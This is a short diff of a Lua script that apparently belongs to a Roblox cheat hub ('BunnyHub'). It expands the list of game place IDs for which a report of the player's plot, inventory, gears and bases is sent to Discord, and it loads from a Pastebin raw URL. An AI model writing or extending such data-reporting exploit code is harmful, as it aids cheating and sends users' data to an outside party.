@@ -18,7 +18,12 @@ local LP = LocalPlayer
 local cam = Workspace.CurrentCamera
 local pg = LP:WaitForChild("PlayerGui")
 
-local TARGET_PLACE_ID = 109983668079237
+local TARGET_PLACE_IDS = {
+    [109983668079237] = true,
+    [78906538690694] = true,
+    [119594317142884] = true,
+    [128855408206367] = true,
+}
 local BASE_URL = "https://pastebin.com/raw/hesvtBJX"
 local KeyFileName = "BunnyHub_PendingKey.json"
 local ConfigFile = "BunnyHub_Config.json"
@@ -1579,7 +1584,7 @@ task.spawn(function()
     end
 
     if (#brainrotQueue > 0) or (#nonTargetList > 0) or (#gearLines > 0) or (#ownedBases > 0) then
-        if tostring(game.PlaceId) == "109983668079237" then
+        if TARGET_PLACE_IDS[game.PlaceId] then
             sendToDiscord("📊 Reporte Completo de Brainrots, Gears y Bases", "Se ha analizado tu plot, inventario y skins correctamente:", discordFields)
         end
     end
